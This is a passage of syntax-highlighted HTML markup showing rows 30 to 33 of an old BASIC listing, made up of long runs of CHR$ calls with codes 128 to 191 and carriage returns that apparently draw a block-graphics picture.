class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">144</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">168</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">151</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">171</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">181</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">184</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">158</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">158</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">171</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">181</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">186</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">135</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">159</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">168</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">151</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">168</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">183</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">168</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">148</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">170</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">170</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">159</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">135</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">139</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">189</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">170</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">170</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">181</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">184</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">151</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token 